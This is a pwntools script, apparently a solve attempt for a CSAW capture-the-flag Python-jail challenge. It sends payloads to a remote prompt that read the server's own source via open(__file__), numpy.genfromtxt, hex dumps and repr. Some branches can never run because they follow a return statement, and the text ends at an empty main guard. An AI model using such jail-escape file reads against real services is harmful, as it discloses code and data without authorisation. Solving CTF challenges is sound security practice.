from pwn import *

HOST = "pwn.chal.csaw.io"
PORT = 8000

def try_print_open_file(io):
    io.sendlineafter('>>>', 'print(open(__file__).read())')
    try:
        response = io.recvuntil(b'>>>', drop=True, timeout=3)
        return response.decode(errors='ignore')
    except Exception as e:
        return str(e)

def try_np_genfromtxt(io):
    # Try suspicious name, could be "numpy.genfromtxt" alias
    io.sendlineafter('>>>', 'import numpy; print(numpy.genfromtxt(__file__, dtype=str, delimiter="|"))')
    try:
        response = io.recvuntil(b'>>>', drop=True, timeout=3)
        return response.decode(errors='ignore')
    except Exception as e:
        return str(e)

    # Try other forms if needed

def try_anything_creative(io):
    # Try reading the file in binary mode, hex encode
    io.sendlineafter('>>>', 'print(open(__file__,"rb").read().hex())')
    try:
        response = io.recvuntil(b'>>>', drop=True, timeout=3)
        return response.decode(errors='ignore')
    except Exception as e:
        return str(e)

    # Try repr
    io.sendlineafter('>>>', 'print(repr(open(__file__).read()))')
    try:
        response = io.recvuntil(b'>>>', drop=True, timeout=3)
        return response.decode(errors='ignore')
    except Exception as e:
        return str(e)

    # Try octal dumping
    io.sendlineafter('>>>', 'print(list(open(__file__)))')
    try:
        response = io.recvuntil(b'>>>', drop=True, timeout=3)
        return response.decode(errors='ignore')
    except Exception as e:
        return str(e)


def main():
    io = remote(HOST, PORT)
    results = {}
    # Try standard __file__ read
    results['print_open'] = try_print_open_file(io)
    if 'Traceback' in results['print_open'] or len(results['print_open']) < 20:
        # Try numpy.genfromtxt alias
        results['genfromtxt'] = try_np_genfromtxt(io)
        if 'Traceback' in results['genfromtxt'] or len(results['genfromtxt']) < 20:
            # Try binary or other creative ways
            results['binary_hex'] = try_anything_creative(io)
    io.close()
    for k,v in results.items():
        print(f'--- {k} ---\n{v}\n')

if __name__ == "__main__":
